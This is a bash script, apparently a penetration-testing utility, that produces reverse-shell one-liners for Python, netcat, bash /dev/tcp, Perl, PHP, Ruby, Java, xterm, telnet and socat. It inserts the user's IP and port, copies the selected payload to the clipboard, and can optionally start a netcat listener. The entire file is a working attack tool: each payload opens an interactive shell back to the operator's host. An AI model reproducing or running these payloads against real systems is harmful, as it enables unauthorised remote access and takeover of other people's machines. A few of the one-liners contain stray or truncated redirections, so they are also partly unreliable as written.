#!/bin/bash

# rshells - ya boi darkrain
# Takes cmdline args
# -p for port -s for shell and -l sets up a nc listener on that port
# Default port is 443
# To add more one liners, simply copy the format in the switch case below
# variables to inject are $port and $ip
# you will need xclip for the clipboard access
# sudo apt install xclip

## FUNCTIONS ##
function usage(){
    echo -e "Usage: $0 [-p <port>] [-s <rshell \e[91m(required)\e[0m>] [-l run nc listener]"
}

## Dependancies ##
command -v xclip >/dev/null 2>&1 || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
type xclip >/dev/null 2>&1 || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }
hash xclip 2>/dev/null || { echo >&2 "Please install xclip: sudo apt install xclip"; exit 1; }

# default variables
port="443"
listen=0
shell="null"

# Get args
while getopts 'p:s:l' c
do
    case $c in
        l) listen=1 ;;
        p) port="$OPTARG" ;;
        s) shell="$OPTARG" ;;
        *)
            usage
            exit 2
    esac
done

## Set options ##
mynetip=$(hostname -I | tr -d '[:space:]')
export mynetip

if [ "$mynetip" = "127.0.0.1" ]
then
    echo -e "\e[91mNo valid ip\e[0m"
    exit 3
fi
echo -e "\e[0;33m$mynetip\e[0m grabbed, stored, and exported as \e[0;33mmynetip\e[0m"
ip="$mynetip"

## Shell Copy ##
case $shell in
'python') # Done
	echo -n "python -c '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"$ip"',"$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''" | xclip -selection clipboard
	echo -e "\e[32mPython Shell Copied\e[0m"
	;;
'nc') # Done
	echo -n "nc -e /bin/sh" $ip $port | xclip -selection clipboard
	echo -e "\e[32mNet Cat Shell Copied\e[0m"
	;;

'bash') # Done
	echo -n "bash -i >& /dev/tcp/"$ip"/"$port" 0>&1 >" | xclip -selection clipboard
	echo -e "\e[32mBash Shell Copied\e[0m"
	;;

'perl') # Done
	echo perl -e 'use Socket;$i="'$ip'";$p="'$port'";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' | xclip -selection clipboard
	echo -e "\e[32mPerl Shell Copied\e[0m"
	;;
'php') # Done
        echo -n "php -r '$sock=fsockopen("$ip","$port");exec("/bin/sh -i <&3 >&3 2>&3");'" | xclip -selection clipboard
        echo -e "\e[32mPHP Shell Copied\e[0m"
        ;;
'ruby') # Done
        echo -n "ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'" | xclip -selection clipboard
        echo -e "\e[32mRuby Shell Copied\e[0m"
        ;;
'java') # Done
        printf 'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'$ip'/'$port';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()' | xclip -selection clipboard
        echo -e "\e[32mJava Shell Copied\e[0m"
        ;;
'xterm') # Done
        echo -n "xterm -display $ip:$port" | xclip -selection clipboard
        echo -e "\e[32mXterm Shell Copied\e[0m"
        ;;
'telnet') # Done
        echo -n "rm -f /tmp/p; mknod /tmp/p p && telnet "$ip" "$port" 0/tmp/p" | xclip -selection clipboard
        echo -e "\e[32mTelnet Shell Copied\e[0m"
        ;;
'socat') # Done
        echo -n '> socat tcp-connect:'$ip':'$port' exec:"bash -li",pty,stderr,setsid,sigint,sane' | xclip -selection clipboard
        echo -e "\e[32mSocat Shell Copied\e[0m"
        ;;
*) # Case for not finding anything
	echo -e "\e[91mDid not copy anything\e[0m"
    listen=0
	;;
esac


## Optional Listener ##
if test $listen -eq 1
then
    echo "Setting up listener on $port..."
    sudo nc -lvnp "$port"
fi
